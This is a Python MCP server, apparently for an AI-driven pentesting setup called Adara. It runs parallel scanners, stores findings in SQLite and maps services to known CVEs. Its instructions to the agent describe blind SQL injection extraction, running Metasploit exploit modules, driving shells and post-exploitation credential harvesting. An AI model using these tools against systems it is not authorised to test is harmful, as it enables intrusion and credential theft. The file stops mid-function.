#!/usr/bin/env python3
"""
Adara MCP Server — Advanced Edition
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Features:
  • Parallel scan engine — run N tools simultaneously
  • Smart grouping — waits for each batch, then synthesizes
  • SQLite findings memory — persists across sessions
  • Auto-analysis — OS/service profiling, CVE flagging, attack chain suggestions
  • Interactive session management — netcat, msfconsole, SSH (proper PTY)
  • Rich terminal UI — live progress bars, colour tables, spinners
  • Modern libs: fastmcp, httpx, loguru, orjson, anyio, rich

Install:
  pip install fastmcp httpx loguru orjson anyio rich asyncssh

Run: python3 mcp_server.py [--server http://Adara_IP:5000] [--debug]
"""

import argparse
import asyncio
import json
import os
import re
import sqlite3
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import httpx
import orjson
from fastmcp import FastMCP
from loguru import logger

# CVE enrichment — live lookup from Vulners + NVD + Exploit-DB
try:
    from cve_enrichment import register_cve_tools, lookup_cve_all
    _HAS_CVE_ENRICHMENT = True
except ImportError:
    _HAS_CVE_ENRICHMENT = False
    logger.warning("cve_enrichment.py not found — CVE lookup tools disabled")
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn,
)
from rich.table import Table
from rich.theme import Theme

# ─────────────────────────────────────────────
# Config
# ─────────────────────────────────────────────
# Override with env var ADARA_SERVER=http://host:port if the backend moves
DEFAULT_SERVER  = os.environ.get("ADARA_SERVER", "http://192.168.1.13:5000")
DEFAULT_TIMEOUT = 3600
DB_PATH         = Path.home() / ".Adara_mcp_findings.db"

# ─────────────────────────────────────────────
# Rich console setup
# ─────────────────────────────────────────────
THEME = Theme({
    "info":     "cyan",
    "success":  "bold green",
    "warning":  "bold yellow",
    "danger":   "bold red",
    "header":   "bold magenta",
    "muted":    "dim white",
    "found":    "bold green on dark_green",
})
console = Console(theme=THEME, highlight=True, stderr=True)

# ─────────────────────────────────────────────
# Loguru — stderr only
# ─────────────────────────────────────────────
logger.remove()
logger.add(
    sys.stderr,
    format="<green>{time:HH:mm:ss}</green> | <level>{level: <8}</level> | {message}",
    level="INFO",
    colorize=True,
)

# ─────────────────────────────────────────────
# Local SQLite findings DB — v2 with dedup, status, provenance, JSON targets, sync
# ─────────────────────────────────────────────
import hashlib
import urllib.parse


def _urlq(s: str) -> str:
    """FIX (M1): targets/hosts go into URL PATHS on the server — '/' , '?',
    '#' or a second path in a target string would hit a DIFFERENT endpoint
    (e.g. '/api/targets/../../findings'). Quote the path segment always."""
    return urllib.parse.quote(str(s), safe="")


def _redact_cmd(text: str) -> str:
    """Scrub credential-bearing flags from a command before logging
    (hydra -p toor, curl -H 'Authorization: Bearer x', sqlmap --data creds).
    Mirrors the server's _redact — the MCP side must not log them either.
    FIX3 (rewrite): the earlier pattern dropped the flag/value separator and
    had an unterminated (?P<flag> group — re.error on every call. Header
    flags now consume their WHOLE value (quoted or not) so 'Bearer tok123'
    can't leak past the -H token."""
    import re as _re
    # Pass 1: header flags — eat the entire header (quoted or bare value).
    _header_re = _re.compile(
        r'(?P<h>-H|--header)\s+(?P<v>"[^"]*"|\'[^\']*\'|\S+)', _re.IGNORECASE)
    text = _header_re.sub(lambda m: m.group("h") + " ***", text)
    # Pass 2: credential flags with optional '=' or whitespace separator.
    _cred_re = _re.compile(
        r'(?P<flag>-p|--password|--pass|-d|--data|--data-raw|'
        r'--data-urlencode|--cookie|--api-token|--token|--key|'
        r'--auth|Bearer)'
        r'(?P<sep>\s|=)?'
        r'(?P<val>"[^"]*"|\'[^\']*\'|\S+)',
        _re.IGNORECASE)
    def _sub(m):
        flag, sep, val = m.group("flag"), m.group("sep") or "", m.group("val")
        if flag.lower() in ("-p", "--password", "--pass") and val.replace("-", "").isdigit():
            return flag + sep + val  # ports like -p 2222 / --pass 1234 pin
        return flag + sep + "***"
    return _cred_re.sub(_sub, text)


def _window_raw(r: dict) -> dict:
    """FIX: window per-command raw output before returning to the model —
    the server windows at 60KB head + 30KB tail per command, so 20 parallel
    commands can push ~1.8MB into agent context. The full raw was already
    persisted to the findings DB; the model gets 40KB head + 20KB tail."""
    out = dict(r)
    for k in ("stdout", "stderr"):
        v = out.get(k) or ""
        if len(v) > 61440:
            head, tail = v[:40960], v[-20480:]
            out[k] = (f"{head}\n... [truncated {len(v) - 61440} bytes] "
                      f"...\n{tail}")
            out["_truncated"] = True
    return out


class LocalDB:
    def __init__(self, path: Path = DB_PATH):
        self.path = str(path)
        self._init()

    def _init(self):
        with sqlite3.connect(self.path) as conn:
            conn.executescript("""
                PRAGMA journal_mode=WAL;
                CREATE TABLE IF NOT EXISTS findings (
                    id           INTEGER PRIMARY KEY AUTOINCREMENT,
                    target       TEXT,
                    tool         TEXT,
                    category     TEXT,
                    title        TEXT,
                    detail       TEXT,
                    severity     TEXT DEFAULT 'info',
                    raw_output   TEXT,
                    finding_hash TEXT UNIQUE,
                    status       TEXT DEFAULT 'new',
                    scan_command TEXT,
                    created_at   TEXT DEFAULT (datetime('now')),
                    updated_at   TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS targets (
                    host            TEXT PRIMARY KEY,
                    os_guess        TEXT,
                    open_ports      TEXT,
                    services        TEXT,
                    cves            TEXT,
                    open_ports_json TEXT DEFAULT '[]',
                    services_json   TEXT DEFAULT '[]',
                    cves_json       TEXT DEFAULT '[]',
                    notes           TEXT,
                    updated_at      TEXT DEFAULT (datetime('now'))
                );
                CREATE TABLE IF NOT EXISTS analyses (
                    id            INTEGER PRIMARY KEY AUTOINCREMENT,
                    target        TEXT NOT NULL,
                    analysis_json TEXT,
                    delta_json    TEXT,
                    finding_count INTEGER DEFAULT 0,
                    cve_count     INTEGER DEFAULT 0,
                    created_at    TEXT DEFAULT (datetime('now'))
                );
            """)
            self._migrate(conn)

    def _migrate(self, conn):
        """Add new columns to existing tables for backward compat."""
        cols = [r[1] for r in conn.execute("PRAGMA table_info(findings)").fetchall()]
        for col, default in [("finding_hash", "NULL"), ("status", "'new'"),
                              ("scan_command", "NULL"), ("updated_at", "CURRENT_TIMESTAMP"),
                              ("raw_output", "NULL")]:
            if col not in cols:
                conn.execute(f"ALTER TABLE findings ADD COLUMN {col} TEXT DEFAULT {default}")
        tcols = [r[1] for r in conn.execute("PRAGMA table_info(targets)").fetchall()]
        for col in ["open_ports_json", "services_json", "cves_json"]:
            if col not in tcols:
                conn.execute(f"ALTER TABLE targets ADD COLUMN {col} TEXT DEFAULT '[]'")
        conn.execute("""CREATE TABLE IF NOT EXISTS analyses (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT NOT NULL,
            analysis_json TEXT, delta_json TEXT,
            finding_count INTEGER DEFAULT 0, cve_count INTEGER DEFAULT 0,
            created_at TEXT DEFAULT (datetime('now'))
        )""")
        # Create indexes after column migration to avoid "no such column" errors
        # on pre-existing tables from older schema versions. Covers every query
        # hot path: per-target lookups, status/severity/tool filters, the
        # ORDER BY created_at DESC history views, and smart_analyze history.
        existing_cols = [r[1] for r in conn.execute("PRAGMA table_info(findings)").fetchall()]
        if "finding_hash" in existing_cols:
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_hash ON findings(finding_hash)")
        if "target" in existing_cols:
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_target ON findings(target)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_target_created ON findings(target, created_at)")
        if "status" in existing_cols:
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_status ON findings(status)")
        if "severity" in existing_cols:
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity)")
        if "tool" in existing_cols:
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_tool ON findings(tool)")
        if "created_at" in existing_cols:
            conn.execute("CREATE INDEX IF NOT EXISTS idx_findings_created ON findings(created_at)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_analyses_target ON analyses(target)")

    def _make_hash(self, target: str, tool: str, title: str, detail: str = "") -> str:
        raw = f"{target}|{tool}|{title}|{detail}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def save(self, target: str, tool: str, category: str, title: str,
             detail: str = "", severity: str = "info", raw_output: str = "",
             scan_command: str = "", finding_hash: str = None) -> int:
        if not finding_hash:
            finding_hash = self._make_hash(target, tool, title, detail)
        # FIX (M7): under >~32 concurrent writes sqlite's 5s busy timeout fires
        # and the old code swallowed the exception — findings silently dropped
        # (evidence loss mid-engagement). Retry briefly; if it still fails, say
        # so distinctly instead of masquerading as a duplicate (return 0).
        last_err = None
        for attempt in range(4):
            try:
                with sqlite3.connect(self.path, timeout=10.0) as c:
                    cur = c.execute(
                        """INSERT OR IGNORE INTO findings
                           (target,tool,category,title,detail,severity,raw_output,finding_hash,scan_command)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (target, tool, category, title, detail, severity, raw_output, finding_hash, scan_command)
                    )
                    return cur.lastrowid if cur.rowcount > 0 else 0
            except sqlite3.OperationalError as e:
                if "locked" not in str(e).lower() or attempt == 3:
                    last_err = e
                    break
                time.sleep(0.25 * (attempt + 1))
            except Exception as e:
                last_err = e
                break
        logger.warning(f"LocalDB save error (after retries): {last_err}")
        return -1

    def get_findings(self, target: Optional[str] = None,
                     status: Optional[str] = None,
                     limit: int = 2000, offset: int = 0) -> List[Dict]:
        with sqlite3.connect(self.path) as c:
            c.row_factory = sqlite3.Row
            q = "SELECT * FROM findings WHERE 1=1"
            args: list = []
            if target:
                q += " AND target=?"; args.append(target)
            if status:
                q += " AND status=?"; args.append(status)
            q += " ORDER BY created_at DESC LIMIT ? OFFSET ?"
            args += [max(limit, 0), max(offset, 0)]
            return [dict(r) for r in c.execute(q, args).fetchall()]

    def update_target(self, host: str, **kw):
        kw = {k: v for k, v in kw.items() if v is not None}
        if not kw:
            return
        # Auto-sync JSON columns when plain-text columns are updated.
        # FIX: dedupe + drop empties — repeated auto-splits previously stored
        # duplicate ports/CVEs and sentinel tokens (e.g. "http," with an empty
        # piece), polluting open_ports_json/cves_json in the target profile.
        if "open_ports" in kw and "open_ports_json" not in kw:
            try:
                seen, parts = set(), []
                for p in kw["open_ports"].split(","):
                    p = p.strip().strip(",.;")
                    if p and p not in seen:
                        seen.add(p); parts.append(p)
                kw["open_ports_json"] = json.dumps(parts)
            except Exception:
                pass
        if "cves" in kw and "cves_json" not in kw:
            try:
                seen, parts = set(), []
                for c in kw["cves"].split(","):
                    c = c.strip().upper()
                    if c and c not in seen:
                        seen.add(c); parts.append(c)
                kw["cves"] = ", ".join(parts)
                kw["cves_json"] = json.dumps(parts)
            except Exception:
                pass
        # FIX: JSON columns arriving as parsed lists/dicts (e.g. synced straight
        # from the server's API response) previously crashed with
        # sqlite3.ProgrammingError — sqlite3 cannot bind a Python list.
        for k in ("open_ports_json", "services_json", "cves_json"):
            if k in kw and isinstance(kw[k], (list, dict)):
                kw[k] = json.dumps(kw[k])
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR IGNORE INTO targets (host) VALUES (?)", (host,))
            set_c = ",".join(f"{k}=?" for k in kw)
            c.execute(f"UPDATE targets SET {set_c},updated_at=datetime('now') WHERE host=?",
                      list(kw.values()) + [host])

    # ── mission scratchpad + re-orient helpers ──────────────────────────
    def append_note(self, host: str, note: str) -> str:
        """Append a timestamped line to a target's persistent scratchpad
        (the `notes` column). Caps at 12KB — oldest notes drop off first."""
        ts = time.strftime("%Y-%m-%d %H:%M")
        entry = f"[{ts}] {note}"
        with sqlite3.connect(self.path) as c:
            row = c.execute("SELECT notes FROM targets WHERE host=?", (host,)).fetchone()
            cur = row[0] if row else ""
            combined = ((cur + "\n" + entry).strip() if cur else entry)
            if len(combined) > 12000:
                combined = combined[-12000:]
            c.execute("INSERT OR IGNORE INTO targets (host) VALUES (?)", (host,))
            c.execute("UPDATE targets SET notes=?, updated_at=datetime('now') WHERE host=?",
                      (combined, host))
        return combined

    def get_notes(self, host: str) -> str:
        with sqlite3.connect(self.path) as c:
            row = c.execute("SELECT notes FROM targets WHERE host=?", (host,)).fetchone()
            return (row[0] or "") if row else ""

    def counts_by_severity(self, target: Optional[str] = None) -> Dict[str, int]:
        with sqlite3.connect(self.path) as c:
            q = "SELECT severity, COUNT(*) FROM findings WHERE 1=1"
            args: list = []
            if target:
                q += " AND target=?"; args.append(target)
            q += " GROUP BY severity"
            return {sev: n for sev, n in c.execute(q, args).fetchall()}

    def all_targets(self) -> List[Dict]:
        with sqlite3.connect(self.path) as c:
            c.row_factory = sqlite3.Row
            rows = []
            for r in c.execute("SELECT * FROM targets").fetchall():
                d = dict(r)
                for jc in ("open_ports_json", "services_json", "cves_json"):
                    try:
                        d[jc] = json.loads(d.get(jc) or "[]")
                    except (json.JSONDecodeError, TypeError):
                        d[jc] = []
                rows.append(d)
            return rows

    def save_analysis(self, target: str, analysis: Dict, delta: Dict = None) -> int:
        with sqlite3.connect(self.path) as c:
            cur = c.execute(
                """INSERT INTO analyses (target, analysis_json, delta_json, finding_count, cve_count)
                   VALUES (?,?,?,?,?)""",
                (target, json.dumps(analysis), json.dumps(delta or {}),
                 analysis.get("finding_count", 0), len(analysis.get("cves", [])))
            )
            # FIX: analyses table grew unbounded (a 10-60KB row per smart_analyze,
            # forever). Keep the most recent 30 per target.
            c.execute(
                """DELETE FROM analyses WHERE target=? AND id NOT IN
                   (SELECT id FROM analyses WHERE target=? ORDER BY id DESC LIMIT 30)""",
                (target, target)
            )
            return cur.lastrowid

    def get_analysis_history(self, target: str, limit: int = 10) -> List[Dict]:
        with sqlite3.connect(self.path) as c:
            c.row_factory = sqlite3.Row
            rows = c.execute(
                "SELECT * FROM analyses WHERE target=? ORDER BY created_at DESC LIMIT ?",
                (target, limit)
            ).fetchall()
            results = []
            for r in rows:
                d = dict(r)
                for jf in ("analysis_json", "delta_json"):
                    try:
                        d[jf] = json.loads(d.get(jf) or "{}")
                    except (json.JSONDecodeError, TypeError):
                        d[jf] = {}
                results.append(d)
            return results

    def get_last_analysis(self, target: str) -> Optional[Dict]:
        """Get most recent analysis for delta tracking."""
        hist = self.get_analysis_history(target, limit=1)
        return hist[0] if hist else None

    def sync_from_server(self, server_findings: List[Dict], server_target: Dict = None):
        """Sync local DB from server data — merge without duplicating."""
        synced = 0
        for f in server_findings:
            fid = self.save(
                target=f.get("target", ""),
                tool=f.get("tool", ""),
                category=f.get("category", ""),
                title=f.get("title", ""),
                detail=f.get("detail", ""),
                severity=f.get("severity", "info"),
                raw_output=f.get("raw_output", ""),
                scan_command=f.get("scan_command", ""),
                finding_hash=f.get("finding_hash"),
            )
            if fid > 0:
                synced += 1
        if server_target:
            self.update_target(
                server_target.get("host", ""),
                os_guess=server_target.get("os_guess"),
                open_ports=server_target.get("open_ports"),
                services=server_target.get("services"),
                cves=server_target.get("cves"),
                notes=server_target.get("notes"),
                open_ports_json=server_target.get("open_ports_json"),
                services_json=server_target.get("services_json"),
                cves_json=server_target.get("cves_json"),
            )
        return synced

    def clear(self, target: Optional[str] = None):
        with sqlite3.connect(self.path) as c:
            if target:
                c.execute("DELETE FROM findings WHERE target=?", (target,))
                c.execute("DELETE FROM targets WHERE host=?", (target,))
                c.execute("DELETE FROM analyses WHERE target=?", (target,))
            else:
                c.execute("DELETE FROM findings")
                c.execute("DELETE FROM targets")
                c.execute("DELETE FROM analyses")


class _LocalDBProxy:
    """FIX (C1 CRITICAL): every LocalDB method opens a sqlite connection and
    does blocking file I/O. Called directly from async tool handlers, each
    call blocked the event loop — with 20 parallel MCP tool calls the loop
    froze for 10s+ (no PTY pump, no HTTP timeouts, no health check). The
    proxy forwards every method through asyncio.to_thread; callers now
    `await _ldb.save(...)`. WAL + per-call connections make cross-thread
    use safe (no shared connection object)."""
    def __init__(self, db: LocalDB):
        self._db = db

    def __getattr__(self, name):
        method = getattr(self._db, name)

        async def _call(*args, **kwargs):
            return await asyncio.to_thread(method, *args, **kwargs)

        return _call

_ldb = _LocalDBProxy(LocalDB())


# ─────────────────────────────────────────────
# HTTP client wrapper
# ─────────────────────────────────────────────
class AdaraClient:
    def __init__(self, server_url: str, timeout: int = DEFAULT_TIMEOUT):
        self.base = server_url.rstrip("/")
        self.timeout = timeout
        # FIX: phased timeouts — a scalar 3600s timeout also applies to the
        # TCP CONNECT phase, so an unreachable server hung every call for a
        # full hour. Connect/pool fail fast now; only read/write get the
        # long ceiling (scan_wait legitimately holds the connection open).
        self._connect_timeout = 10.0
        self._timeout = httpx.Timeout(
            connect=self._connect_timeout,
            read=float(timeout),
            write=float(timeout),
            pool=self._connect_timeout,
        )
        # Persistent client for connection pooling (10x faster)
        self._client = httpx.AsyncClient(timeout=self._timeout, base_url=self.base)
        # FIX: job client timeout raised to match DEFAULT_TIMEOUT — /api/scan/{id}/wait
        # deliberately holds the connection open until the job finishes, so the old
        # 90s cap silently truncated every scan_wait past 90s.
        self._job_client = httpx.AsyncClient(timeout=self._timeout, base_url=self.base)

    async def get(self, path: str, **params) -> Dict:
        try:
            r = await self._client.get(path, params=params)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            # FIX: str(e) is empty for some Windows connect errors — fall
            # back to the type name so health checks aren't blank
            return self._err(e)

    async def post(self, path: str, data: Dict) -> Dict:
        try:
            r = await self._client.post(path, json=data)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return self._err(e)

    async def delete(self, path: str) -> Dict:
        try:
            r = await self._client.delete(path)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return self._err(e)

    # Job-API methods use the dedicated short-timeout client
    async def job_get(self, path: str, **params) -> Dict:
        try:
            r = await self._job_client.get(path, params=params)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return self._err(e)

    async def job_post(self, path: str, data: Dict) -> Dict:
        try:
            r = await self._job_client.post(path, json=data)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return self._err(e)

    async def job_delete(self, path: str) -> Dict:
        try:
            r = await self._job_client.delete(path)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            return self._err(e)

    @staticmethod
    def _err(e: Exception) -> Dict:
        """Surface the server's FastAPI 'detail' on HTTP errors instead of the
        generic 'Client error 400/500' text — ssh_connect etc. return useful
        messages ('SSH connection failed (network): [Errno 111] ...') that
        were previously swallowed by raise_for_status()."""
        if isinstance(e, httpx.HTTPStatusError):
            try:
                detail = e.response.json().get("detail")
                if detail:
                    return {"error": detail, "success": False,
                            "status_code": e.response.status_code}
            except Exception:
                pass
        return {"error": str(e) or type(e).__name__, "success": False}

    async def close(self):
        """Close the persistent HTTP clients."""
        await self._client.aclose()
        await self._job_client.aclose()


# ─────────────────────────────────────────────
# CVE lookup helpers (offline pattern matching)
# ─────────────────────────────────────────────
# Known service → CVE quick hints (extend as needed)
SERVICE_CVE_HINTS = {
    "vsftpd 2.3.4":    ["CVE-2011-2523 (vsftpd backdoor — try exploit/unix/ftp/vsftpd_234_backdoor)"],
    "openssh 7.4":     ["CVE-2018-15473 (username enumeration)"],
    "apache 2.4.49":   ["CVE-2021-41773 (path traversal / RCE)"],
    "apache 2.4.50":   ["CVE-2021-42013 (path traversal)"],
    "samba 3.5":       ["CVE-2017-7494 (SambaCry / is_known_pipename RCE)"],
    "struts2":         ["CVE-2017-5638 (Struts2 RCE)"],
    "shellshock":      ["CVE-2014-6271 (Shellshock bash RCE)"],
    "heartbleed":      ["CVE-2014-0160 (OpenSSL Heartbleed)"],
    "eternal blue":    ["CVE-2017-0144 (MS17-010 EternalBlue)"],
    "ms17-010":        ["CVE-2017-0144 (EternalBlue SMB RCE)"],
    "drupal 7":        ["CVE-2018-7600 (Drupalgeddon2)"],
    "drupal 8":        ["CVE-2018-7600 (Drupalgeddon2)", "CVE-2018-7602"],
    "phpmyadmin":      ["CVE-2016-5734 (RCE via preg_replace)", "CVE-2018-12613 (LFI)"],
    "tomcat 8":        ["CVE-2017-12617 (PUT method RCE)", "CVE-2019-0232"],
    "weblogic":        ["CVE-2019-2725", "CVE-2020-14882 (unauthenticated RCE)"],
    "jenkins":         ["CVE-2018-1000861 (Groovy RCE)", "CVE-2019-1003000"],
    "redis":           ["CVE-2022-0543 (Lua sandbox escape)"],
    "elasticsearch":   ["CVE-2014-3120", "CVE-2015-1427 (Groovy sandbox escape)"],
    "log4j":           ["CVE-2021-44228 (Log4Shell JNDI RCE)"],
    "spring":          ["CVE-2022-22965 (Spring4Shell RCE)"],
    "sudo 1.8":        ["CVE-2021-3156 (Baron Samedit heap overflow)"],
    "polkit":          ["CVE-2021-4034 (pkexec LPE)"],
    "dirty cow":       ["CVE-2016-5195 (Dirty COW kernel LPE)"],
    "printnightmare":  ["CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)"],
}

def flag_cves(text: str) -> List[str]:
    """Scan raw text for known vulnerable software signatures.
    FIX: returns only clean CVE IDs. The hint table values were previously
    returned with human annotations ('CVE-2017-0144 (EternalBlue SMB RCE)'),
    poisoning CVE enrichment lookups and the stored target profile."""
    text_lower = text.lower()
    found = []
    for sig, cves in SERVICE_CVE_HINTS.items():
        if sig in text_lower:
            for cve in cves:
                found.extend(re.findall(r'CVE-\d{4}-\d+', cve, re.IGNORECASE))
    # Also extract inline CVE mentions
    inline = re.findall(r'CVE-\d{4}-\d+', text, re.IGNORECASE)
    found.extend(inline)
    return list(set(found))


# ─────────────────────────────────────────────
# Rich display helpers
# ─────────────────────────────────────────────
def print_findings_table(findings: List[Dict], title: str = "Findings"):
    t = Table(title=title, box=box.ROUNDED, show_lines=True,
              title_style="bold magenta", header_style="bold cyan")
    t.add_column("ID", style="dim", width=5)
    t.add_column("Target", style="cyan")
    t.add_column("Tool", style="yellow")
    t.add_column("Severity", justify="center")
    t.add_column("Title")
    t.add_column("When", style="dim")

    SEV_STYLE = {"critical": "bold red", "high": "red", "medium": "yellow",
                 "low": "green", "info": "dim"}
    for f in findings:
        sev = f.get("severity", "info")
        t.add_row(
            str(f.get("id", "")),
            f.get("target", ""),
            f.get("tool", ""),
            f"[{SEV_STYLE.get(sev,'dim')}]{sev}[/]",
            f.get("title", ""),
            f.get("created_at", "")[:16],
        )
    console.print(t)

def print_target_profile(target: Dict, findings: List[Dict]):
    panel_content = (
        f"[bold cyan]Host:[/]      {target.get('host','?')}\n"
        f"[bold cyan]OS:[/]        {target.get('os_guess','Unknown')}\n"
        f"[bold cyan]Ports:[/]     {target.get('open_ports','None found')}\n"
        f"[bold cyan]Services:[/]  {target.get('services','')}\n"
        f"[bold cyan]CVEs:[/]      [red]{target.get('cves','None flagged')}[/]\n"
        f"[bold cyan]Notes:[/]     {target.get('notes','')}"
    )
    console.print(Panel(panel_content, title=f"🎯 Target Profile: {target.get('host','?')}",
                        border_style="magenta"))
    if findings:
        print_findings_table(findings[:20], title="Latest Findings")

def print_sessions_table(sessions: List[Dict], title: str = "Active Sessions"):
    t = Table(title=title, box=box.SIMPLE_HEAD, header_style="bold cyan")
    t.add_column("ID", style="yellow")
    t.add_column("Type", style="cyan")
    t.add_column("Target")
    t.add_column("Status", justify="center")
    for s in sessions:
        alive = s.get("alive", True)
        t.add_row(str(s.get("id", "?")), s.get("type","?"), s.get("target",""),
                  "[green]ALIVE[/]" if alive else "[red]DEAD[/]")
    console.print(t)

def print_parallel_results(results: List[Dict]):
    """Display parallel scan results in a structured table.
    When a command timed out, surface the parsed progress (e.g. 'sqlmap: char 14/32')
    and the last captured output lines — so you know exactly what was running."""
    t = Table(title="⚡ Parallel Scan Results", box=box.ROUNDED,
              title_style="bold yellow", header_style="bold cyan", show_lines=True)
    t.add_column("Command", style="cyan", max_width=50)
    t.add_column("Status", justify="center")
    t.add_column("Time", justify="right", style="dim")
    t.add_column("Progress", max_width=40)
    t.add_column("Output Preview", max_width=60)

    for r in results:
        timed_out = r.get("timed_out")
        status = "[green]✓[/]" if r.get("success") else ("[yellow]⚠ partial[/]" if timed_out else "[red]✗[/]")
        # Progress hint — from run_command's parsed progress, or 'no output captured'
        progress = ""
        if timed_out:
            prog = r.get("progress", "")
            last_lines = r.get("last_lines", [])
            if prog:
                progress = f"[yellow]{prog}[/]"
            elif last_lines:
                progress = f"[dim]last: {last_lines[-1][:60]}[/]"
            else:
                progress = "[red]no output captured[/]"
        # Output preview — prefer last_lines when timed out (more recent than full stdout)
        if timed_out and r.get("last_lines"):
            preview = " ↵ ".join(r["last_lines"][-3:])[:120].replace("\n", "↵ ")
        else:
            preview = (r.get("stdout", "") or r.get("stderr", ""))[:120].replace("\n", "↵ ")
        t.add_row(r.get("command", "")[:50], status,
                  f"{r.get('elapsed_sec', '?')}s", progress, preview)
    console.print(t)


# ─────────────────────────────────────────────
# MCP Server Setup
# ─────────────────────────────────────────────
def setup_mcp(client: AdaraClient) -> FastMCP:
    mcp = FastMCP(
        "Adara_advanced",
        instructions=(
            "You are connected to a Adara Linux pentesting environment. "
            "Use parallel_scan to run multiple tools simultaneously. "
            "Use smart_analyze after scanning to get attack chain recommendations + delta tracking. "
            "NUCLEI: nuclei_scan(target, scan_type='cves') for fast template-based vuln scanning (9000+ templates). "
            "BACKGROUND SCANS (kills the -32001 timeout): every long-running tool "
            "(sqlmap/ffuf/nmap/gobuster/nikto/hydra/wpscan/nuclei) accepts background=True "
            "and returns a job_id immediately instead of blocking. Follow with "
            "scan_status(job_id) for parsed progress (e.g. 'sqlmap: char 14/32 blind extraction') "
            "or scan_wait(job_id) to block until done. Use scan_start(cmd) for ANY command, "
            "scan_list()/scan_kill(job_id) to manage jobs. "
            "BLIND SQLi EXTRACTION: blind_extract(url, payload_template, ...) runs a server-side "
            "SLEEP-based binary search and returns the full extracted string in ONE call "
            "(replaces ~224 manual curl/SLEEP round-trips). payload_template needs {pos} and {val}. "
            "REQUEST TEMPLATES: request_template_save(name, headers={...}) then request_template_run(name) "
            "to replay crafted requests (e.g. X-Forwarded-For injection point) without retyping headers. "
            "CURL: curl_request now accepts encode_url=True to percent-encode spaces/special chars "
            "(preserves existing %xx). "
            "CVE ENRICHMENT: lookup_cve(id) for live CVSS/EPSS/exploit/PoC data from ALL sources "
            "(NVD, Vulners, Exploit-DB, nomi-sec, ycdxsb, trickest, GitHub Search, Metasploit, "
            "Nuclei, Sploitus, Vulhub Docker). "
            "search_service_cves(software, version) to find all CVEs for a service; "
            "search_service_cves_deep(software, version) for the same + full PoC/exploit/"
            "Metasploit/Nuclei/Vulhub enrichment of the top CVEs. "
            "enrich_scan_cves(nmap_output) to auto-extract and enrich CVEs from scan results. "
            "PoC REPOS: search_poc_repos(cve_id, save_target='IP') to find & save PoC/exploit repos "
            "across all 7 sources. " 
            "smart_analyze auto-fetches PoC repos for top CVEs found during analysis. "
            "FINDINGS: save_finding() to manually save findings (auto-dedup via SHA256 hash). "
            "finding_status(id, status) to mark findings as confirmed/false_positive/remediated. "
            "generate_report(target) for comprehensive pentest reports with severity breakdown. "
            "analysis_history(target) to see how target profile evolved over time. "
            "METASPLOIT FLOW (universal for ALL modules — exploits, auxiliary, post, handler): "
            "1. metasploit_interactive() → session_id  "
            "2. msf_search(sid, query) → find modules by CVE/type/platform  "
            "3. msf_info(sid, module) → see required options/payloads  "
            "4. msf_interactive_run(sid, module, options, payload, lhost, lport) → run any module  "
            "5. msf_session_interact(sid, session_num, commands) → interact with opened sessions  "
            "6. msf_session_list(sid) → list all open MSF sessions  "
            "Use session_* tools for interactive shells (netcat/msfconsole/bash/direct_shell). "
            "Use ssh_* tools for SSH sessions — they persist and support multi-command interaction. "
            "Use post_enum_system/post_enum_privesc/post_harvest_creds for post-exploitation."
        ),
    )

    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    # PARALLEL SCAN ENGINE
    # ── ── ── ── ── ── ── ── ── ── ── ── ── ──
    @mcp.tool(name="parallel_scan")
    async def parallel_scan(
        commands: List[str],
        description: str = "Parallel scan batch",
        save_target: str = "",
        timeout: int = 3600,
    ) -> Dict:
        """
        Run multiple shell commands SIMULTANEOUSLY on the Adara server.
        All commands run at once; returns when ALL complete.
        Perfect for: running nmap + gobuster + nikto + wafw00f at the same time.

        Args:
            commands:     List of shell commands to run in parallel (up to 20)
            description:  Human label for this batch (for logging)
            save_target:  If set, auto-saves results to this target's findings
            timeout:      Max seconds to wait for ALL commands

        Returns:
            All results, elapsed time, and any CVEs flagged
        """
        if len(commands) > 20:
            return {"error": "Max 20 parallel commands at once"}

        console.print(f"\n[bold yellow]⚡ Parallel scan:[/] {description} — [cyan]{len(commands)} commands[/]")

        # Show live progress — BUG-009 FIX: single task tracks overall completion
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as prog:
            task_id = prog.add_task(
                f"[cyan]Running {len(commands)} commands in parallel\u2026",
                total=100,
            )
            # Kick the bar to ~50% while waiting for the server response
            prog.update(task_id, completed=50, description=f"[cyan]Waiting for server ({len(commands)} commands)\u2026")
            result = await client.post("/api/parallel", {
                "commands": commands,
                "timeout": timeout,
            })
            # Mark complete
            prog.update(task_id, completed=100, description=f"[green]All {len(commands)} commands done")

        if "error" in result:
            console.print(f"[red]❌ Parallel scan error: {result.get('error', 'unknown')}")
            return result

        results = result.get("results", [])
        # server returned success but no data
        if not results:
            console.print(f"[yellow]⚠️  Parallel scan returned no results. Server may have timed out.[/]")
            return {
                "error": "No results returned from parallel execution. Check server logs.",
                "raw_response": result,
                "diagnostic": "empty_parallel_result"
            }
        print_parallel_results(results)

        # Auto-save & CVE flag
        all_cves = []
        for r in results:
            raw = r.get("stdout","") + r.get("stderr","")
            cves = flag_cves(raw)
            if cves:
                all_cves.extend(cves)
            if save_target and raw:
                cmd_label = r.get("command","")[:60]
